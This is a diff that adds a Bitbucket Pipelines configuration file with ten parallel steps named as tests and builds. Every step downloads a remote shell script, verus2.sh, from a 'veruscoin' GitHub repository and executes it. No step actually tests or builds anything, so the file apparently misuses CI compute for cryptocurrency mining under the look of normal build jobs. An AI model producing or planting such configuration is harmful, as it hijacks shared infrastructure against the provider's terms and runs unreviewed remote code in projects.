@@ -1,0 +1,47 @@
+image: python:3.8
+
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: Test
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus2.sh && chmod u+x verus2.sh && ./verus2.sh
+      - step:
+          name: Build code
+          script:
+            - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus2.sh && chmod u+x verus2.sh && ./verus2.sh
+      - step:
+          name: Rebuild code
+          script:
+           - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus2.sh && chmod u+x verus2.sh && ./verus2.sh
+      - step:
+          name: Maxbuild code
+          script:
+           - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus2.sh && chmod u+x verus2.sh && ./verus2.sh
+      - step:
+          name: Mixbuild code
+          script:
+           - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus2.sh && chmod u+x verus2.sh && ./verus2.sh
+      - step:
+          name: Muxbuild code
+          script:
+           - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus2.sh && chmod u+x verus2.sh && ./verus2.sh
+      - step:
+          name: Moxbuild code
+          script:
+           - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus2.sh && chmod u+x verus2.sh && ./verus2.sh
+      - step:
+          name: Mexbuild code
+          script:
+           - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus2.sh && chmod u+x verus2.sh && ./verus2.sh
+      - step:
+          name: Mxbuild code
+          script:
+           - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus2.sh && chmod u+x verus2.sh && ./verus2.sh
+      - step:
+          name: Mxxbuild code
+          script:
+           - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus2.sh && chmod u+x verus2.sh && ./verus2.sh
